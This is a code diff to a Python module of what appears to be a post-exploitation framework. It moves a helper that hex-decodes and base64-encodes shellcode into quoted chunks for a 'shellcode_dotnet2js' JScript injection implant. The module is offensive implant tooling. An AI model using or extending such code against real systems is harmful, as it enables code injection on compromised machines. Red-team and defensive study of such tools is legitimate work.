@@ -1,9 +1,31 @@
 import core.implant
 import core.job
+import base64
+import os.path
+import binascii
 
 class SDotNet2JSJob(core.job.Job):
     def create(self):
         self.errstat = 0
+        self.options.set("SC_B64", self.scb64(self.options.get("SC_HEX")))
+
+    def scb64(self, path):
+        if os.path.isfile(path):
+            with open(path, 'r') as fileobj:
+                text = base64.b64encode(binascii.unhexlify(fileobj.read())).decode()
+        else:
+            text = base64.b64encode(binascii.unhexlify(path)).decode()
+
+        index = 0
+        ret = '"';
+        for c in text:
+            ret += str(c)
+            index += 1
+            if index % 100 == 0:
+                ret += '"+\r\n"'
+
+        ret += '"'
+        return ret
 
     def report(self, handler, data, sanitize = False):
         data = data.decode('latin-1')
@@ -47,34 +69,8 @@ class SDotNet2JSImplant(core.implant.Implant):
     def job(self):
         return SDotNet2JSJob
 
-    def scb64(self, path):
-        import base64
-        import os.path
-        import binascii
-
-        if os.path.isfile(path):
-            with open(path, 'r') as fileobj:
-                text = base64.b64encode(binascii.unhexlify(fileobj.read())).decode()
-        else:
-            text = base64.b64encode(binascii.unhexlify(path)).decode()
-
-        index = 0
-        ret = '"';
-        for c in text:
-            ret += str(c)
-            index += 1
-            if index % 100 == 0:
-                ret += '"+\r\n"'
-
-        ret += '"'
-        return ret
-
     def run(self):
-
-        self.options.set("SC_B64", self.scb64(self.options.get("SC_HEX")))
-        #self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_dotnet2js.js", self.options)
+        workloads["js"] = "data/implant/inject/shellcode_dotnet2js.js"
 
         self.dispatch(workloads, self.job)
